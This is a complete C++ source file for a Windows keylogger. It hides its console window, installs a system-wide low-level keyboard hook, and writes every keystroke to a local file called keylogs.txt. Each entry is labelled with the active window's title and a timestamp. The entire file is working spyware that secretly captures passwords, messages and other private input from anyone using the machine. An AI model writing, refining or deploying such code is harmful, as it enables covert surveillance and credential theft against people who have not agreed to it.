#include <string>
#include <tchar.h>
#include <Windows.h>
#include <time.h>
#include <iostream>
#include <fstream>
#include <winUser.h>

using namespace std;

#pragma warning (disable: 4996)
#pragma warning (disable: 4703)

int save(int key);
LRESULT __stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam);
HHOOK hook;
KBDLLHOOKSTRUCT kbStruct;

ofstream file;

extern char prevProg[256] = "";
int save(int key)
{



	if (key == 1 || key == 2)
		return 0;

	HWND foreground = GetForegroundWindow();
	DWORD threadId;
	HKL keyBoardLayout;

	if (foreground)
	{
		threadId = GetWindowThreadProcessId(foreground, NULL);
		keyBoardLayout = GetKeyboardLayout(threadId);

		char crrProg[256];

		GetWindowText(foreground, crrProg, 256);
		cout << crrProg << " " << prevProg << "\n";
		if (strcmp(crrProg, prevProg) != 0)
		{
			strcpy_s(prevProg, crrProg);

			time_t t= time(NULL);
			
			struct tm* tm = localtime(&t);
			char Time[64];

			strftime(Time, sizeof(Time), "%c", tm);

			file << "\n\n\n[Program: " << crrProg << " Date'n'Time: " << Time << "]";
		}
		cout << key << endl;
	}
	if (key == VK_BACK)
		file << "[BACKSPACE]";
	else if (key == VK_RETURN)
		file << "\n";
	else if (key == VK_SPACE)
		file << " ";
	else if (key == VK_TAB)
		file << "[TAB]";
	else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
		file << "[SHIFT]";
	else if (key == VK_CONTROL || key == VK_RCONTROL || key == VK_LCONTROL)
		file << "[CTRL]";
	else if (key == 20)
		file << "[CAPS]";
	else if (key == VK_ESCAPE)
		file << "[ESC]";
	else if (key == VK_HOME)
		file << "[HOME]";
	else if (key == VK_END)
		file << "[END]";
	else if (key == VK_LEFT)
		file << "[LEFT]";
	else if (key == VK_RIGHT)
		file << "[RIGHT]";
	else if (key == VK_UP)
		file << "[UP]";
	else if (key == VK_DOWN)
		file << "[DOWN]";
	else if (key == 190 || key == 110)
		file << ".";
	else if (key == 189 || key == 109)
		file << "-";
	else
	{
		char crrKey;
		bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 ||
			(GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
			(GetKeyState(VK_RSHIFT) & 0x1000) != 0)
			lower = !lower;

		crrKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, keyBoardLayout);
		if (!lower)
		{
			crrKey = tolower(crrKey);
		}

		file << char(crrKey);
	}
	file.flush();
	return 0;
}

LRESULT _stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{
			kbStruct = *((KBDLLHOOKSTRUCT*)lParam);

			save(kbStruct.vkCode);
		}
	}

	return CallNextHookEx(hook, nCode, wParam, lParam);
}

int main()
{
	file.open("keylogs.txt", ios_base::ate);

	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);

	if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallBack, NULL, 0)))
	{
	MessageBox(NULL, "Smth's gone wrong", "Error", MB_ICONERROR);
	}

	MSG message;

	while (true)
	{
		GetMessage(&message, NULL, 0, 0);
	}
}